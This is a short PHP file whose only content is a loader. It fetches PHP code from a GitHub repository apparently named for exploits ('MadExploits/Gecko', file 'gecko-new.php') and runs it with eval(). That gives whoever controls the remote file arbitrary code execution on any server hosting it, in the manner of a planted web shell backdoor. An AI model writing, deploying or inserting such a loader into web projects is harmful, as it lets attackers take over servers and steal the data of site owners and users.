<?php
$well = file_get_contents('https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php');
$well = "?> ".$well;
eval($well);
